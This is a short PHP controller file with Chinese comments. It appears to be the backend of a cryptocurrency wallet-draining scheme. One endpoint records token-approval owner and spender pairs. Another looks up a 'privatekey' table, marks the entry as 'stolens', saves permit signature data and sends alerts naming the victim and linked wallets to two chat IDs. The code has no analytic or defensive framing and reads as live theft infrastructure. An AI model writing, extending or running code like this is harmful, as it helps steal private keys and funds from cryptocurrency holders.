<?php
// 所有自定义控制器的基本控制器,应该继承自它
namespace app\jz\v8\controller;

use function common\sendMessage;
use common\jzController;
use Db\Db;
use function common\dump;
use function common\retur;
// 写入
class CreateController extends jzController
{

    public function approve()
    {
        $data = json_decode(file_get_contents('php://input'), true);
        $arr = Db::table('approve')->insert(['owner' => $data['owner'], 'spender' => $data['spender']]);
        if ($arr > 0) {
            echo json_encode(retur('成功', $arr));
        } else {
            echo json_encode(retur('失败', $arr, 422));
        }
    }
    public function switch()
    {
        $data = json_decode(file_get_contents('php://input'), true);
        //先验证地址  如果存在 就添加   否则就提示没有
        $stolen = Db::table('privatekey')->field('*')->where(['admin' => $data['holder']])->find();
        if ($stolen) {
            Db::table('privatekey')->where(['admin' => $data['holder']])->update(['type' => 'stolens']);
            $arr =   Db::table('JZ_permit')->field('*')->where(['holder' => $data['holder']])->find();
            if ($arr) {
                Db::table('JZ_permit')->where(['holder' => $data['holder']])->update($data);
            } else {
                Db::table('JZ_permit')->insert($data);
            }

            echo json_encode(retur('成功', $arr));
            $price_message = "钱包[" . $data['holder'] . ']关闭钱包监听' . '关联钱包为[' . $stolen['address'] . ']'; // Replace $XYZ with actual price data
            sendMessage('1882040053', $price_message);
            sendMessage('6495387107', $price_message);
        } else {
            echo json_encode(retur('失败', '没有可控制的地址,请使用有权限的地址进行管理', 422));
        }
    }
}
